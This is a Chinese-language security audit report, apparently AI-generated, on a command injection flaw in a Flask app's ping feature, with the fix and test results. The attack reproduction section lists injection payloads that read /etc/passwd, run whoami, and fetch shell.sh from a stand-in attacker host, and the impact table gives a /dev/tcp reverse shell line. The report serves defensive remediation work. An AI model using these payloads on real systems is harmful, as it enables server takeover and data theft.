# 命令注入漏洞分析与修复报告

> **项目名称：** 用户信息管理平台（Flask User Login）
> **报告版本：** v8.0
> **报告日期：** 2026-07-15
> **报告人：** Claude Code (AI 辅助)
> **风险评估：** 🔴 严重（Critical）

---

## 📖 目录

- [一、执行摘要](#一执行摘要)
- [二、漏洞总览](#二漏洞总览)
- [三、漏洞详情](#三漏洞详情)
  - [VULN-601：命令注入 — shell=True + 字符串拼接](#vuln-601命令注入--shelltrue--字符串拼接)
  - [VULN-602：命令注入 — 错误输出泄露系统信息](#vuln-602命令注入--错误输出泄露系统信息)
- [四、修复前后对比](#四修复前后对比)
- [五、修复验证](#五修复验证)
- [六、安全建议](#六安全建议)

---

## 一、执行摘要

### 概述

在本次安全审计中，对 **Ping 网络诊断功能**（`/ping`）进行了全面的命令注入漏洞排查。该功能使用 `subprocess.check_output()` 执行 `ping` 命令，但由于使用 `shell=True` 和 `f-string` 字符串拼接，存在严重的命令注入漏洞。攻击者可在 IP 地址参数中注入任意系统命令。

共发现 **2 个漏洞**，均为严重级，已全部修复。

| 指标 | 数值 |
|------|------|
| 总漏洞数 | 2 |
| 严重（Critical） | 2 |
| 已修复 | 2（100%） |

### 什么是命令注入？

命令注入（Command Injection）是指攻击者通过在用户输入中插入系统命令分隔符（如 `;`、`&&`、`|` 等），让服务端执行非预期的系统命令。与 SSRF 的区别：

```
SSRF：服务器代我访问 URL（读数据）
命令注入：服务器代我执行命令（控制服务器）
```

### 攻击路径

```
攻击者输入 ip = "127.0.0.1 && cat /etc/passwd"
         ↓
f"ping -c 3 {ip}" → "ping -c 3 127.0.0.1 && cat /etc/passwd"
         ↓
shell=True → bash 执行整条字符串
         ↓
ping 执行完毕后 → cat /etc/passwd 也被执行
         ↓
/etc/passwd 内容返回给攻击者
```

---

## 二、漏洞总览

| 编号 | 漏洞类型 | CWE 编号 | 风险 | 状态 |
|------|----------|----------|------|------|
| VULN-601 | 命令注入 — shell=True + 字符串拼接 | CWE-78 | 🔴 严重 | ✅ 已修复 |
| VULN-602 | 命令注入错误信息泄露 | CWE-78 | 🔴 严重 | ✅ 已修复 |

---

## 三、漏洞详情

### VULN-601：命令注入 — shell=True + 字符串拼接

| 属性 | 值 |
|------|----|
| 漏洞类型 | OS Command Injection |
| CWE 编号 | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| OWASP 映射 | A03:2021 – Injection |
| 风险等级 | 🔴 严重 |

#### 漏洞代码

```python
ip = request.form.get("ip", "")                        # 用户输入，无过滤
command = f"ping -c 3 {ip}"                            # f-string 直接拼接
output = subprocess.check_output(command, shell=True,   # shell=True 启用 bash 解析
                                   timeout=30, stderr=subprocess.STDOUT)
```

#### 根因分析

两个关键问题共同导致了命令注入：

| 问题 | 说明 |
|------|------|
| **`shell=True`** | 启用 shell 解析，`&&`、`;`、`\|` 等特殊字符被当作命令分隔符 |
| **`f-string` 拼接** | 用户输入直接拼入命令字符串，未做任何转义或校验 |

```python
# shell=True 时，subprocess 执行的是：
/bin/sh -c "ping -c 3 127.0.0.1 && cat /etc/passwd"
#                                ^^^^^^^^^^^^^^^^^^^ 被当作第二条命令执行
```

#### 攻击复现

```bash
# ① 使用 && 注入（前面成功后才执行）
POST /ping
ip = 127.0.0.1 && cat /etc/passwd

# ② 使用 ; 注入（无论前面是否成功都执行）
POST /ping
ip = 127.0.0.1; ls -la

# ③ 使用 | 注入
POST /ping
ip = 127.0.0.1 | id

# ④ 使用 $(...) 注入
POST /ping
ip = $(whoami)

# ⑤ 使用反引号注入
POST /ping
ip = `whoami`

# ⑥ 使用 & 后台执行
POST /ping
ip = 127.0.0.1 & wget http://attacker.com/shell.sh &
```

#### 影响分析

| 影响 | 说明 |
|------|------|
| 完全服务器失陷 | 攻击者可执行任意系统命令 |
| 数据窃取 | `cat /etc/passwd`、`cat data/users.db` |
| 反弹 Shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` |
| 植入后门 | 下载并执行恶意脚本 |
| 横向移动 | 扫描内网其他主机 |

---

### VULN-602：命令注入错误信息泄露

| 属性 | 值 |
|------|----|
| 漏洞类型 | 信息泄露辅助命令注入 |
| 风险等级 | 🔴 严重 |

即使限制了部分字符，攻击者仍可通过错误回显探测系统信息。修复前的错误处理直接返回异常详情，辅助了攻击者的注入尝试。

---

## 四、修复前后对比

### 修复方案详解

修复采用了 **双重防护** 策略：

#### 防护 1：输入白名单校验

```python
def validate_ip_or_hostname(target):
    """验证输入是否为合法的 IP 地址或域名"""
    # 允许 IPv4 地址
    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
    if re.match(ip_pattern, target):
        parts = target.split(".")
        if all(0 <= int(p) <= 255 for p in parts):
            return True
        return False

    # 允许合法域名（仅字母、数字、点、短横线）
    hostname_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$"
    if re.match(hostname_pattern, target):
        return True

    return False
```

#### 防护 2：移除 shell=True，改用参数列表

```python
# 修复前（危险）
command = f"ping -c 3 {ip}"
output = subprocess.check_output(command, shell=True, ...)

# 修复后（安全）
command = ["ping", "-c", "3", ip]     # 参数列表，无需转义
output = subprocess.check_output(command, ...)  # 无 shell=True
```

### 修复前后对比表

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| 命令构建方式 | `f"ping -c 3 {ip}"` 字符串拼接 | `["ping", "-c", "3", ip]` 参数列表 |
| shell | `shell=True` | 默认 `shell=False` |
| 输入校验 | ❌ 无任何校验 | ✅ IP 地址 + 域名白名单正则 |
| 注入字符 `;` | 作为命令分隔符执行 | 被正则拦截 |
| 注入字符 `&&` | 作为逻辑操作符执行 | 被正则拦截 |
| 注入字符 `\|` | 作为管道执行 | 被正则拦截 |
| 注入字符 `$()` | 作为命令替换执行 | 被正则拦截 |
| 注入字符 `` ` `` | 作为命令替换执行 | 被正则拦截 |
| 非法 IP `999.999.999.999` | 传给 ping，报错 | 被正则拦截 |
| 正常 IP `127.0.0.1` | ✅ 正常 | ✅ 正常 |
| 正常域名 `example.com` | ✅ 正常 | ✅ 正常 |

### 代码 diff

```diff
- command = f"ping -c 3 {ip}"
- output = subprocess.check_output(command, shell=True, timeout=30,
-                                   stderr=subprocess.STDOUT)
+ # 输入校验
+ if not validate_ip_or_hostname(ip):
+     return render_template("ping.html", error="无效的 IP 地址或域名格式")
+
+ # 参数列表方式执行，禁用 shell
+ command = ["ping", "-c", "3", ip]
+ output = subprocess.check_output(command, timeout=30,
+                                   stderr=subprocess.STDOUT)
```

---

## 五、修复验证

### 测试结果

| # | 测试用例 | 修复前 | 修复后 | 状态 |
|---|---------|--------|--------|------|
| 1 | `127.0.0.1` 正常 Ping | 正常 | ✅ 正常 | ✅ |
| 2 | `8.8.8.8` 外网 IP | 正常 | ✅ 正常 | ✅ |
| 3 | `example.com` 域名 | 正常 | ✅ 正常 | ✅ |
| 4 | `127.0.0.1 && cat /etc/passwd` | 读取到密码 | ✅ 拦截 | ✅ |
| 5 | `127.0.0.1; ls` | 列出目录 | ✅ 拦截 | ✅ |
| 6 | `127.0.0.1 \| id` | 显示 uid | ✅ 拦截 | ✅ |
| 7 | `$(whoami)` | 执行 whoami | ✅ 拦截 | ✅ |
| 8 | `` `whoami` `` | 执行 whoami | ✅ 拦截 | ✅ |
| 9 | `127.0.0.1 & whoami &` | 后台执行 | ✅ 拦截 | ✅ |
| 10 | `999.999.999.999` 非法 IP | ping 报错 | ✅ 拦截 | ✅ |
| 11 | `abc` 非法输入 | ping 报错 | ✅ 拦截 | ✅ |

### 验证命令（可复现）

```bash
# 正常功能不受影响
curl -X POST http://127.0.0.1:5000/ping \
  -b "session=xxx" -d "ip=127.0.0.1" | grep "ttl"

# 命令注入被拦截
curl -X POST http://127.0.0.1:5000/ping \
  -b "session=xxx" -d "ip=127.0.0.1 && cat /etc/passwd" | grep "无效"
```

---

## 六、安全建议

### 命令注入防御清单

| 原则 | 说明 |
|------|------|
| **永远不要用 `shell=True`** | 使用参数列表形式调用 subprocess |
| **输入白名单** | 只允许合法 IP 地址或域名格式 |
| **最小权限** | 应用不使用 root 权限运行 |
| **禁止拼接命令行** | 用列表传参而非字符串拼接 |

### 本次修复

| 优先级 | 措施 | 对应漏洞 |
|--------|------|----------|
| 🔴 P0 | 输入白名单校验（IP + 域名正则） | VULN-601 |
| 🔴 P0 | 移除 `shell=True`，改用参数列表 | VULN-601 |
| 🔴 P0 | 异常信息脱敏 | VULN-602 |

### 不同方案对比

| 方案 | 安全性 | 推荐 |
|------|--------|------|
| `subprocess.run(["ping", ip])` 无 shell | ✅ 完全防御 | ✅ **最佳** |
| `shlex.quote()` 转义输入 | 🟡 可能遗漏边缘情况 | ❌ |
| 正则过滤黑名单字符 | ❌ 总有绕过方式 | ❌ |
| `shell=True` + f-string | ❌ 高危 | ❌ 禁止使用 |

---

## 参考资料

| 来源 | 链接 |
|------|------|
| CWE-78: OS Command Injection | https://cwe.mitre.org/data/definitions/78.html |
| OWASP Command Injection | https://owasp.org/www-community/attacks/Command_Injection |
| OWASP Input Validation Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html |

---

*本报告由 Claude Code 自动生成。*
*报告版本 v8.0 — 聚焦 OS 命令注入漏洞。*
